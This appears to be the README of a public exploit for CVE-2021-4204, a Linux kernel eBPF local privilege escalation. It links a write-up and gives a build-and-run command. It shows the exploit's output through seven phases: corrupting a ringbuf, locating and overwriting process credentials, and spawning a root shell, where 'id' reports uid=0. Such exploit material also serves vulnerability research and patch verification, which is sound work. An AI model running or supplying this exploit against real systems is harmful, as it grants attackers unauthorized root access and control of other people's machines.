# CVE-2021-4204

Chinese writeup: https://tr3e.ee/posts/cve-2021-4204-linux-kernel-ebpf-lpe.txt

For educational/research purposes only. Use at your own risk.

## Build & Run

```bash
$ sh build_and_run.sh
Build from source...
cc -I include -static -w -o exploit exploit.c
Start exploit! This might take some while...
[*] phase(1/7) 'create bpf map(s)' running
[+] phase(1/7) 'create bpf map(s)' done
[*] phase(2/7) 'corrupt ringbuf' running
Killed
--------------------------------
[*] phase(1/7) 'create bpf map(s)' running
[+] phase(1/7) 'create bpf map(s)' done
[*] phase(2/7) 'corrupt ringbuf' running
[+] phase(2/7) 'corrupt ringbuf' done
[*] phase(3/7) 'spawn processes' running
[+] phase(3/7) 'spawn processes' done
[*] phase(4/7) 'find cred (slow)' running
[+] phase(4/7) 'find cred (slow)' done
[*] phase(5/7) 'overwrite cred' running
[+] phase(5/7) 'overwrite cred' done
[*] phase(6/7) 'spawn root shell' running
[+] Enjoy root!
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
[+] phase(6/7) 'spawn root shell' done
[*] phase(7/7) 'clean up the mess' running
[+] phase(7/7) 'clean up the mess' done
```
